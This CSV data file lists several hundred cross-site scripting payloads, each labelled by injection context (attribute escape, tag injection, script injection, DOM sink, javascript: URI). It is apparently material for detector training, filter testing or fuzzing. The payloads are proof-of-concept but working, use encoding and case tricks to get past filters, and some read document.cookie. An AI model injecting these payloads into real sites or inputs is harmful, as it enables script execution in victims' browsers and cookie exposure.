payload,context
""" ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) """,attribute_escape
"""><Svg onBegIn=ConSolE.lOg(1)>",tag_injection
%3Csvg onfocus=confirm(location.hash)%3E,tag_injection
"""%3E%3Csvg onmouseenter=alert('XSS')%3E",tag_injection
"EvaL(""ConFirM('XSS')"")",dom_sink
"""><svg onbegin=confirm(1)>",tag_injection
%3Csvg onmouseenter=console.log(document.cookie)%3E,tag_injection
' onb&#101;gin=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape
<scr	ipt>/*/prompt(1)</scr	ipt>,script_injection
"%22><svg onfocus=console.log(String.fromCharCode(88,83,83))>",tag_injection
"<svG oNerRor=coNfiRm(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection
%22 onload=confirm(location.hash) %22,attribute_escape
"""%3E%3Csvg onfocus=console.log(location.hash)%3E",tag_injection
<svg ontoggle=\u0061lert('XSS')/>,tag_injection
' ontoggl&#101;=confirm('XSS') ',attribute_escape
<svG oNclIck=coNfiRm(DocUmeNt.DomAin)/>,tag_injection
%22><svg onerror=confirm(%27XSS%27)>,tag_injection
"""%3E%3Csvg onmouseenter=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
<svG oNloAd=ProMpt(1)/>,tag_injection
"""><svg onfocus=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",tag_injection
%3Csvg onerror=confirm(document.cookie)%3E,tag_injection
<svg onmouseover=console.log(1)>,tag_injection
<script>prompt`docum&#101;nt.dom&#97;in`</script>,script_injection
""" oNfoCus=coNfiRm(DocUmeNt.DomAin) aUtoFocUs=""",attribute_escape
<scRipT>//prOmpT('XSS')</scRipT>,script_injection
"%3Csvg onbegin=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
""" onlo&#97;d=confirm(loc&#97;tion.h&#97;sh) """,attribute_escape
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=aLerT(STriNg.FroMChArCOde(88,83,83))>"")",dom_sink
"document.write(""<img src=x onerror=\u0061lert(String.fromCharCode(88,83,83))>"")",dom_sink
"' onmouseenter=console.log(String.fromCharCode(88,83,83)) '",attribute_escape
javascript:void(confirm(document.domain)),js_uri
<svG oNloAd=ConSolE.lOg(1)>,tag_injection
%22><svg onmouseover=console.log(document.domain)>,tag_injection
<scRipT>//coNfiRm(1)</scRipT>,script_injection
JavAscRipT:vOid(prOmpT(dOcuMenT.cOokIe)),js_uri
<svg onerror=prompt(location.hash)/>,tag_injection
""" oNfoCus=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
<svG oNbeGin=prOmpT(dOcuMenT.cOokIe)>,tag_injection
' oNerRor=coNsoLe.Log(doCumEnt.doMaiN) ',attribute_escape
""" onb&#101;gin=prompt(1) """,attribute_escape
j&#97;vascript:alert(document.domain),js_uri
"""%3E%3Cimg onload=alert(String.fromCharCode(88,83,83))%3E",tag_injection
""" onfocus=\u0061lert(document.cookie) """,attribute_escape
<svG oNloAd=ProMpt(doCumEnt.doMaiN)>,tag_injection
""" onlo&#97;d=prompt('XSS') """,attribute_escape
<img onload=\u0061lert(location.hash)/>,tag_injection
' oNbeGin=coNsoLe.Log('XSS') ',attribute_escape
"eval(""prompt(location.hash)"")",dom_sink
<svG oNloAd=ConSolE.lOg(LocAtiOn.HasH)>,tag_injection
<svg onerror=prompt(1)>,tag_injection
javascr	ipt:alert(document.cookie),js_uri
""" onmouseover=console.log(document.cookie) """,attribute_escape
' onmouseover=prompt(document.cookie) ',attribute_escape
<svG oNbeGin=coNsoLe.Log(doCumEnt.doMaiN)/>,tag_injection
"""><Svg onMouSeeNteR=pRomPt(1)>",tag_injection
"""><svg onerror=alert(location.hash)>",tag_injection
j&#97;v&#97;script:consol&#101;.log(loc&#97;tion.h&#97;sh),js_uri
<svG oNbeGin=prOmpT('XSS')>,tag_injection
<svg onlo&#97;d=confirm('XSS')>,tag_injection
""" on&#101;rror=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) """,attribute_escape
JavAscRipT:vOid(prOmpT(1)),js_uri
"""%3E%3Csvg onmouseover=alert(1)%3E",tag_injection
"""><svg ontoggle=alert(location.hash)>",tag_injection
<scRipT>/*/pRomPt('XSS')</sCriPt>,script_injection
<svG oNclIck=prOmpT(lOcaTioN.hAsh)/>,tag_injection
""" oNfoCus=prOmpT(dOcuMenT.cOokIe) auTofOcuS=""",attribute_escape
"""><svg onb&#101;gin=confirm(docum&#101;nt.dom&#97;in)>",tag_injection
""" onfocus=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) """,attribute_escape
<scRipT>//prOmpT(lOcaTioN.hAsh)</ScrIpt>,script_injection
<svg onmouseover=alert(document.cookie)/>,tag_injection
<svg onload=\u0061lert('XSS')/>,tag_injection
"""><svg onbegin=prompt(document.domain)>",tag_injection
"%3Csvg onclick=confirm(String.fromCharCode(88,83,83))/%3E",tag_injection
%22 ontoggle=confirm(%27XSS%27) %22,attribute_escape
%27 onclick=confirm(document.domain) %27,attribute_escape
"""><Svg onTogGle=coNsoLe.Log(doCumEnt.doMaiN)>",tag_injection
"setTimeout(%22prompt(location.hash)%22,0)",dom_sink
"""><Svg onTogGle=prOmpT(lOcaTioN.hAsh)>",tag_injection
"<script>/*/console.log(String.fromCharCode(88,83,83))</script>",script_injection
""" onmouseenter=console.log(document.cookie) """,attribute_escape
"""><svg onfocus=alert('XSS')>",tag_injection
<svG oNtoGglE=cOnfIrm(doCumEnt.coOkiE)>,tag_injection
<scRipT>pRomPt(1)</scRipT>,script_injection
' onmouseover=alert(1) ',attribute_escape
<svG oNclIck=coNsoLe.Log(doCumEnt.doMaiN)/>,tag_injection
"""><svg ontoggle=prompt(String.fromCharCode(88,83,83))>",tag_injection
<scr	ipt>alert(document.domain)</scr	ipt>,script_injection
"""%3E%3Csvg onclick=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
"""%3E%3Csvg onerror=console.log(location.hash)%3E",tag_injection
%3Csvg onfocus=prompt(location.hash)/%3E,tag_injection
%3Csvg onload=console.log(1)%3E,tag_injection
%3Csvg ontoggle=confirm(document.cookie)%3E,tag_injection
"""><Svg onLoaD=aLerT(lOcaTioN.hAsh)>",tag_injection
<svg onbegin=console.log(%27XSS%27)/>,tag_injection
%3Csvg onbegin=confirm(document.cookie)/%3E,tag_injection
"""><Svg onMouSeoVer=alErt('XSS')>",tag_injection
"""%3E%3Csvg onmouseenter=alert(1)%3E",tag_injection
<svG oNerRor=coNsoLe.Log(loCatIon.haSh)>,tag_injection
%22><img onload=prompt(%27XSS%27)>,tag_injection
"%3Cscript%3E/*/console.log(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
%3Cimg onload=prompt(1)%3E,tag_injection
""" ontoggl&#101;=confirm(1) """,attribute_escape
""" onclick=alert(document.cookie) """,attribute_escape
""" onmouseenter=confirm(1) """,attribute_escape
<script>/*/\u0061lert(location.hash)</script>,script_injection
"<script>consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
""" onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) """,attribute_escape
%27 onmouseenter=prompt(1) %27,attribute_escape
<svg onlo&#97;d=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
%3Csvg ontoggle=alert(document.cookie)%3E,tag_injection
""" onfocus=alert('XSS') autofocus=""",attribute_escape
<svg onfocus=\u0061lert(document.cookie)>,tag_injection
J&#97;VasCriPt:ProMpt('XSS'),js_uri
"%3Csvg onload=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
%3Csvg onbegin=prompt(1)/%3E,tag_injection
"' onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
"""><svg onclick=console.log(document.cookie)>",tag_injection
<svg onclick=confirm(1)/>,tag_injection
' onb&#101;gin=prompt(1) ',attribute_escape
""" onfocus=consol&#101;.log(docum&#101;nt.cooki&#101;) """,attribute_escape
"&#101;v&#97;l(""confirm(docum&#101;nt.cooki&#101;)"")",dom_sink
"setTimeout(%22confirm(1)%22,0)",dom_sink
<svg onb&#101;gin=&#97;l&#101;rt('XSS')/>,tag_injection
<svg onb&#101;gin=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection
"' oNerRor=prOmpT(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
"""><svg onclick=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",tag_injection
""" onmouseenter=prompt(String.fromCharCode(88,83,83)) """,attribute_escape
%22 onfocus=console.log(location.hash) autofocus=%22,attribute_escape
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink
' onclick=console.log('XSS') ',attribute_escape
%22><svg onfocus=console.log(location.hash)>,tag_injection
<svg onerror=confirm(document.domain)/>,tag_injection
"""><svg onlo&#97;d=prompt(docum&#101;nt.cooki&#101;)>",tag_injection
%27 onload=confirm(document.cookie) %27,attribute_escape
J&#97;VasCriPt:AleRt(DocUmeNt.DomAin),js_uri
<svG oNerRor=coNfiRm('XSS')/>,tag_injection
<svg onmouseover=\u0061lert(document.cookie)/>,tag_injection
""" onmous&#101;ov&#101;r=confirm('XSS') """,attribute_escape
' onfocus=\u0061lert(1) ',attribute_escape
%27 onfocus=prompt(%27XSS%27) %27,attribute_escape
' oNerRor=coNfiRm(DocUmeNt.DomAin) ',attribute_escape
""" onclick=prompt(String.fromCharCode(88,83,83)) """,attribute_escape
%27 onbegin=alert(1) %27,attribute_escape
"""><Svg onMouSeeNteR=pRomPt(LocAtiOn.HasH)>",tag_injection
"""><Svg onBegIn=AleRt(1)>",tag_injection
' oNmoUseEntEr=ProMpt(doCumEnt.coOkiE) ',attribute_escape
<img onload=alert(document.domain)/>,tag_injection
""" onb&#101;gin=confirm('XSS') """,attribute_escape
%27 onmouseenter=prompt(%27XSS%27) %27,attribute_escape
<scRipT>pRomPt(DocUmeNt.DomAin)</ScrIpt>,script_injection
"""><Svg onBegIn=ConFirM('XSS')>",tag_injection
<svG oNloAd=ConFirM(dOcuMenT.cOokIe)>,tag_injection
JavAscRipT:pRomPt(DocUmeNt.DomAin),js_uri
"""%3E%3Csvg onerror=alert(location.hash)%3E",tag_injection
' onfocus=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape
"""><Svg onTogGle=alErt(1)>",tag_injection
<script>/x/\u0061lert('XSS')</script>,script_injection
""" onfocus=console.log(location.hash) autofocus=""",attribute_escape
%3Csvg onload=alert('XSS')%3E,tag_injection
<svg onclick=prompt(document.cookie)>,tag_injection
<svg onfocus=alert(location.hash)/>,tag_injection
"%22 onload=alert(String.fromCharCode(88,83,83)) %22",attribute_escape
' onclick=prompt(document.cookie) ',attribute_escape
javascript:void(alert(document.domain)),js_uri
""" ontoggl&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
"<svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
%27 onmouseover=console.log(1) %27,attribute_escape
"<svg on&#101;rror=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
%22><svg onerror=prompt(document.domain)>,tag_injection
"EvaL(""ConFirM(dOcuMenT.dOmaIn)"")",dom_sink
<script>//&#97;l&#101;rt(1)</script>,script_injection
<svg onclick=confirm(document.domain)>,tag_injection
"""><svg onfocus=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection
"""%3E%3Csvg onmouseover=console.log(document.cookie)%3E",tag_injection
""" onmouseover=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape
"<script>/x/prompt(String.fromCharCode(88,83,83))</script>",script_injection
<svG oNclIck=coNfiRm('XSS')/>,tag_injection
%22><svg onmouseover=console.log(%27XSS%27)>,tag_injection
<svg onmous&#101;&#101;nt&#101;r=prompt('XSS')/>,tag_injection
<svg ontoggle=alert(%27XSS%27)>,tag_injection
""" on&#101;rror=confirm(docum&#101;nt.cooki&#101;) """,attribute_escape
"<svG oNclIck=prOmpT(STriNg.FroMChArCOde(88,83,83))>",tag_injection
javascript:void(console.log(%27XSS%27)),js_uri
<svg onclick=confirm('XSS')/>,tag_injection
"""><svg onmous&#101;ov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<svg onerror=console.log(location.hash)/>,tag_injection
"<script>//console.log(String.fromCharCode(88,83,83))</script>",script_injection
%3Csvg onerror=alert(document.domain)/%3E,tag_injection
""" onload=prompt(document.domain) """,attribute_escape
<svg onbegin=alert(document.domain)>,tag_injection
"document.write(""<img src=x onerror=confirm(document.cookie)>"")",dom_sink
<svg ontoggl&#101;=consol&#101;.log('XSS')>,tag_injection
%22><svg onmouseover=console.log(document.cookie)>,tag_injection
' ontoggle=prompt(location.hash) ',attribute_escape
""" oNfoCus=alErt('XSS') aUtoFocUs=""",attribute_escape
"setTimeout(""\u0061lert(document.cookie)"",0)",dom_sink
<svg onclick=consol&#101;.log('XSS')/>,tag_injection
"' oNerRor=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
"""%3E%3Csvg onload=alert(location.hash)%3E",tag_injection
%3Csvg onbegin=confirm(document.cookie)%3E,tag_injection
<svg onclick=alert(location.hash)>,tag_injection
%3Csvg onmouseenter=confirm(location.hash)%3E,tag_injection
"<svg on&#101;rror=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
""" onmous&#101;&#101;nt&#101;r=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
J&#97;VasCriPt:AleRt('XSS'),js_uri
""" onb&#101;gin=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) """,attribute_escape
"""%3E%3Csvg onmouseenter=confirm('XSS')%3E",tag_injection
"""><svg onerror=console.log(1)>",tag_injection
"setTimeout(%22alert(String.fromCharCode(88,83,83))%22,0)",dom_sink
"EvaL(""ProMpt('XSS')"")",dom_sink
"""><svg onerror=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
' onlo&#97;d=prompt(docum&#101;nt.cooki&#101;) ',attribute_escape
"&#101;v&#97;l(""consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))"")",dom_sink
"""%3E%3Csvg onmouseover=prompt(document.cookie)%3E",tag_injection
"""><svg onmouseenter=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
""" onmouseover=prompt(document.cookie) """,attribute_escape
<svg onload=prompt(location.hash)/>,tag_injection
%3Csvg onbegin=confirm(document.domain)/%3E,tag_injection
%3Csvg onbegin=confirm(1)%3E,tag_injection
<scRipT>/*/cOnsOle.loG(1)</ScrIpt>,script_injection
"SetTimEouT(""ConFirM(1)"",0)",dom_sink
<script>\u0061lert`document.cookie`</script>,script_injection
<svg onfocus=prompt(%27XSS%27)/>,tag_injection
' ontoggle=alert(document.domain) ',attribute_escape
"s&#101;tTim&#101;out(""prompt(loc&#97;tion.h&#97;sh)"",0)",dom_sink
"setTimeout(""\u0061lert(location.hash)"",0)",dom_sink
<svG oNerRor=alErt(1)/>,tag_injection
""" oNloAd=ConSolE.lOg('XSS') """,attribute_escape
"setTimeout(""confirm(1)"",0)",dom_sink
""" onlo&#97;d=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape
' ontoggl&#101;=confirm(docum&#101;nt.dom&#97;in) ',attribute_escape
<svg onlo&#97;d=confirm('XSS')/>,tag_injection
%3Csvg onfocus=alert('XSS')%3E,tag_injection
<script>/x/prompt(location.hash)</script>,script_injection
<scRipT>/X/pRomPt(LocAtiOn.HasH)</scRipT>,script_injection
"""><svg onbegin=alert(document.domain)>",tag_injection
<scr	ipt>//confirm(location.hash)</scr	ipt>,script_injection
%3Csvg onmouseover=alert(1)%3E,tag_injection
%22 onfocus=confirm(document.domain) autofocus=%22,attribute_escape
javascr	ipt:alert(location.hash),js_uri
"""><svg onload=alert(document.domain)>",tag_injection
"""><svg ontoggle=alert(1)>",tag_injection
"' onfocus=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
<svg onmouseover=console.log(document.cookie)>,tag_injection
"<svG oNmoUseEntEr=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection
""" onlo&#97;d=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
%22 onmouseenter=console.log(1) %22,attribute_escape
"<svg ontoggle=prompt(String.fromCharCode(88,83,83))/>",tag_injection
"%3Cscript%3E//console.log(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
"<svg onload=alert(String.fromCharCode(88,83,83))>",tag_injection
"<svg onerror=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
<svg onclick=&#97;l&#101;rt('XSS')>,tag_injection
' onerror=prompt(1) ',attribute_escape
"%3Csvg onbegin=alert(String.fromCharCode(88,83,83))%3E",tag_injection
"%3Csvg onerror=alert(String.fromCharCode(88,83,83))%3E",tag_injection
' oNmoUseEntEr=ProMpt('XSS') ',attribute_escape
"document.write(""<img src=x onerror=prompt(location.hash)>"")",dom_sink
%27 onbegin=alert(%27XSS%27) %27,attribute_escape
javascript:void(confirm(1)),js_uri
%3Cimg onload=alert(1)/%3E,tag_injection
<scRipT>/X/pRomPt(DocUmeNt.DomAin)</ScrIpt>,script_injection
<svg ontoggl&#101;=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
j&#97;vascript:confirm(document.domain),js_uri
"""><svg onmous&#101;&#101;nt&#101;r=confirm(docum&#101;nt.cooki&#101;)>",tag_injection
' onload=confirm(1) ',attribute_escape
' onfocus=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape
%22 onerror=console.log(%27XSS%27) %22,attribute_escape
%22><svg ontoggle=console.log(%27XSS%27)>,tag_injection
JavAscRipT:vOid(alErt('XSS')),js_uri
"""><img onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",tag_injection
"<svg onerror=prompt(String.fromCharCode(88,83,83))/>",tag_injection
"' oNmoUseOveR=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
"""%3E%3Csvg onerror=prompt(document.domain)%3E",tag_injection
""" onfocus=prompt(1) """,attribute_escape
<scRipT>//coNsoLe.Log(1)</sCriPt>,script_injection
""" oNerRor=prOmpT(dOcuMenT.dOmaIn) """,attribute_escape
"<script>prompt`String.fromCharCode(88,83,83)`</script>",script_injection
"""><svg onmous&#101;ov&#101;r=consol&#101;.log(1)>",tag_injection
eval(%22console.log(1)%22),dom_sink
<scRipT>//coNfiRm(DocUmeNt.CooKie)</ScrIpt>,script_injection
%3Csvg onmouseenter=alert(1)/%3E,tag_injection
<svG oNfoCus=coNfiRm(DocUmeNt.CooKie)/>,tag_injection
javascr	ipt:void(alert(1)),js_uri
<svg ontoggle=prompt(1)/>,tag_injection
""" onload=prompt('XSS') """,attribute_escape
""" onfocus=\u0061lert(location.hash) """,attribute_escape
<script>/x/prompt(docum&#101;nt.cooki&#101;)</script>,script_injection
<svg onbegin=console.log(document.cookie)>,tag_injection
<svg onlo&#97;d=confirm(docum&#101;nt.cooki&#101;)/>,tag_injection
%3Csvg onload=prompt(document.domain)/%3E,tag_injection
"EvaL(""ConFirM(lOcaTioN.hAsh)"")",dom_sink
"""><Img onLoaD=aLerT(dOcuMenT.cOokIe)>",tag_injection
<svg onbegin=confirm('XSS')>,tag_injection
%3Csvg onmouseover=console.log(document.domain)%3E,tag_injection
"""><svg onmouseenter=prompt(location.hash)>",tag_injection
<script>prompt(docum&#101;nt.dom&#97;in)</script>,script_injection
' onload=confirm(location.hash) ',attribute_escape
<svg ontoggle=\u0061lert(document.domain)>,tag_injection
%27 onerror=alert(location.hash) %27,attribute_escape
""" onfocus=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) &#97;utofocus=""",attribute_escape
<svg onload=prompt('XSS')>,tag_injection
<svG oNloAd=ConSolE.lOg(1)/>,tag_injection
"""%3E%3Csvg onmouseenter=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
<script>/x/alert(%27XSS%27)</script>,script_injection
%3Csvg onbegin=alert('XSS')/%3E,tag_injection
"<scRipT>/*/cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))</ScrIpt>",script_injection
<svg onmouseover=prompt(%27XSS%27)>,tag_injection
<svg onfocus=alert(%27XSS%27)>,tag_injection
<svg onload=alert(document.cookie)>,tag_injection
' ontoggle=prompt(1) ',attribute_escape
<svg onclick=alert(location.hash)/>,tag_injection
<svg onb&#101;gin=prompt(1)/>,tag_injection
""" oNtoGglE=aLerT('XSS') """,attribute_escape
%27 onload=alert(1) %27,attribute_escape
%3Csvg onclick=alert(1)%3E,tag_injection
<scr	ipt>/*/prompt(document.domain)</scr	ipt>,script_injection
document.write(%22<img src=x onerror=confirm(document.cookie)>%22),dom_sink
"""><svg onbegin=console.log(document.domain)>",tag_injection
%3Cscript%3Ealert`document.cookie`%3C/script%3E,script_injection
""" onclick=alert(1) """,attribute_escape
"""><svg onload=\u0061lert(document.domain)>",tag_injection
"""%3E%3Csvg onload=confirm(document.domain)%3E",tag_injection
"""><Svg onLoaD=cOnsOle.loG('XSS')>",tag_injection
"""%3E%3Csvg onmouseenter=prompt('XSS')%3E",tag_injection
JavAscRipT:vOid(prOmpT('XSS')),js_uri
' oNerRor=alErt(1) ',attribute_escape
' oNloAd=ConFirM(lOcaTioN.hAsh) ',attribute_escape
"""><svg on&#101;rror=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
"""%3E%3Csvg onfocus=prompt('XSS')%3E",tag_injection
j&#97;v&#97;script:void(consol&#101;.log(docum&#101;nt.cooki&#101;)),js_uri
j&#97;v&#97;script:prompt(1),js_uri
"""><svg onmous&#101;&#101;nt&#101;r=confirm(docum&#101;nt.dom&#97;in)>",tag_injection
%22 onerror=alert(%27XSS%27) %22,attribute_escape
%22><svg onbegin=prompt(1)>,tag_injection
<svg onbegin=prompt(1)>,tag_injection
%3Csvg onmouseover=confirm(document.cookie)/%3E,tag_injection
document.write(%22<img src=x onerror=prompt(document.domain)>%22),dom_sink
<svg onlo&#97;d=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection
<script>confirm(location.hash)</script>,script_injection
%3Cscript%3E/x/console.log(location.hash)%3C/script%3E,script_injection
%22 onerror=alert(document.cookie) %22,attribute_escape
j&#97;vascript:\u0061lert('XSS'),js_uri
<svg ontoggle=confirm(%27XSS%27)>,tag_injection
"""%3E%3Cimg onload=alert(1)%3E",tag_injection
' onmous&#101;ov&#101;r=prompt(docum&#101;nt.cooki&#101;) ',attribute_escape
%27 ontoggle=console.log(location.hash) %27,attribute_escape
<scRipT>aLerT(dOcuMenT.dOmaIn)</sCriPt>,script_injection
""" onload=console.log(document.domain) """,attribute_escape
"<svg onmouseenter=alert(String.fromCharCode(88,83,83))/>",tag_injection
"%27 onload=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape
<script>//confirm(document.domain)</script>,script_injection
"""><svg on&#101;rror=confirm(docum&#101;nt.cooki&#101;)>",tag_injection
<svg onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(1)>,tag_injection
"""><img onlo&#97;d=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
' onmous&#101;ov&#101;r=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape
j&#97;v&#97;script:void(&#97;l&#101;rt('XSS')),js_uri
<svg onmouseenter=alert('XSS')>,tag_injection
<scr	ipt>confirm('XSS')</scr	ipt>,script_injection
' oNfoCus=coNsoLe.Log('XSS') ',attribute_escape
""" ontoggl&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
<script>//\u0061lert(document.cookie)</script>,script_injection
<script>consol&#101;.log`docum&#101;nt.dom&#97;in`</script>,script_injection
' onfocus=confirm(loc&#97;tion.h&#97;sh) ',attribute_escape
"""><svg onbegin=prompt(1)>",tag_injection
' onerror=\u0061lert('XSS') ',attribute_escape
""" oNfoCus=coNsoLe.Log(doCumEnt.doMaiN) """,attribute_escape
<svg onclick=consol&#101;.log(1)>,tag_injection
%22 onfocus=console.log(1) %22,attribute_escape
"""><Svg onMouSeeNteR=cOnfIrm(doCumEnt.doMaiN)>",tag_injection
<svg onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection
"document.write(""%3Cimg src=x onerror=confirm(location.hash)%3E"")",dom_sink
%22 onmouseenter=console.log(location.hash) %22,attribute_escape
' oNmoUseOveR=cOnfIrm(loCatIon.haSh) ',attribute_escape
javascript:console.log(location.hash),js_uri
<svg onmouseover=\u0061lert(1)/>,tag_injection
' onb&#101;gin=confirm(loc&#97;tion.h&#97;sh) ',attribute_escape
<scRipT>/*/cOnfIrm(loCatIon.haSh)</sCriPt>,script_injection
<scRipT>/X/cOnsOle.loG(dOcuMenT.dOmaIn)</sCriPt>,script_injection
"""><Svg onFocUs=ConSolE.lOg(DocUmeNt.DomAin)>",tag_injection
""" oNloAd=ProMpt(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
' oNclIck=coNsoLe.Log(doCumEnt.doMaiN) ',attribute_escape
"""><svg onb&#101;gin=prompt(loc&#97;tion.h&#97;sh)>",tag_injection
javascript:prompt(document.cookie),js_uri
"' onclick=confirm(String.fromCharCode(88,83,83)) '",attribute_escape
<img onload=\u0061lert('XSS')/>,tag_injection
<script>alert`1`</script>,script_injection
"<svg onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
%22><svg ontoggle=confirm(document.domain)>,tag_injection
' oNloAd=ConFirM(dOcuMenT.cOokIe) ',attribute_escape
""" onfocus=confirm('XSS') &#97;utofocus=""",attribute_escape
<svg onfocus=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection
' oNerRor=prOmpT(lOcaTioN.hAsh) ',attribute_escape
"""><Svg onErrOr=ProMpt(loCatIon.haSh)>",tag_injection
<scr	ipt>alert(document.cookie)</scr	ipt>,script_injection
"""><Svg onLoaD=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
%3Csvg onerror=confirm(document.domain)/%3E,tag_injection
"""><svg ontoggl&#101;=confirm(1)>",tag_injection
"<svG oNmoUseOveR=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))>",tag_injection
<svg onmouseover=prompt(document.cookie)>,tag_injection
""" onmouseover=confirm(document.domain) """,attribute_escape
<scRipT>cOnsOle.loG`lOcaTioN.hAsh`</ScrIpt>,script_injection
<svg onload=console.log(1)>,tag_injection
' oNbeGin=prOmpT(lOcaTioN.hAsh) ',attribute_escape
%3Csvg onclick=confirm(1)%3E,tag_injection
' oNtoGglE=aLerT(dOcuMenT.dOmaIn) ',attribute_escape
""" oNfoCus=alErt(StRinG.fRomChaRCoDe(88,83,83)) aUtoFocUs=""",attribute_escape
<svg ontoggl&#101;=confirm(docum&#101;nt.cooki&#101;)>,tag_injection
%3Csvg ontoggle=confirm('XSS')/%3E,tag_injection
%3Csvg onfocus=console.log(document.cookie)/%3E,tag_injection
' onfocus=&#97;l&#101;rt('XSS') ',attribute_escape
%22><svg onfocus=console.log(%27XSS%27)>,tag_injection
<script>/x/prompt(document.cookie)</script>,script_injection
' onb&#101;gin=&#97;l&#101;rt('XSS') ',attribute_escape
"%22><svg onmouseenter=console.log(String.fromCharCode(88,83,83))>",tag_injection
javascr	ipt:confirm('XSS'),js_uri
<svg onclick=\u0061lert('XSS')/>,tag_injection
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=pRomPt(1)>"")",dom_sink
""" onerror=prompt(1) """,attribute_escape
